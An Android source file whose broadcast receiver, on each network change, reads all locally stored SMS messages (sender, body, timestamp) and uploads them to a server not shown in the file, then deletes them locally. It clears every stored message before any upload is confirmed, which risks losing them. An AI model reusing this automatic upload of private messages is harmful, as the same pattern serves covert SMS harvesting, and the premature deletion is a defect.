package com.example.arafathossain.smsreceiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.util.Log;


public class ConnectionBroadcastReceiver extends BroadcastReceiver implements SMSUpload.OnResponseOkListener {
    DatabaseHelper helper;
    @Override
    public void onReceive(Context context, Intent intent) {
        helper = new DatabaseHelper(context);
        Log.d("status", "connection change");
        if (isNetworkAvailable(context)) {
            Log.d("status", "network available");
            uploadSMS(context);
        }
    }

    public boolean isNetworkAvailable(Context context) {
        ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        return connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI).isConnected() || connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_MOBILE).isConnected();
    }

    private void uploadSMS(Context context) {

        SMSUpload upload = new SMSUpload(context,this);
        Cursor cursor = helper.getAllSMS();
        Log.d("status", cursor.getCount() + "");
        if (cursor.moveToFirst()) {
            do {
                upload.makeRequest(new SMS(cursor.getString(cursor.getColumnIndex(DatabaseHelper.COLUMN_ID)),cursor.getString(cursor.getColumnIndex(DatabaseHelper.COLUMN_FROM)), cursor.getString(cursor.getColumnIndex(DatabaseHelper.COLUMN_BODY)), cursor.getString(cursor.getColumnIndex(DatabaseHelper.COLUMN_TIME))));
                Log.d("ppppp", "oooo");
            } while (cursor.moveToNext());
        }
        helper.deleteAllSMS();
    }

    @Override
    public void OnResponseOk(String id) {
        helper.deleteSMS(id);
        Log.d("delete","true");
    }
}
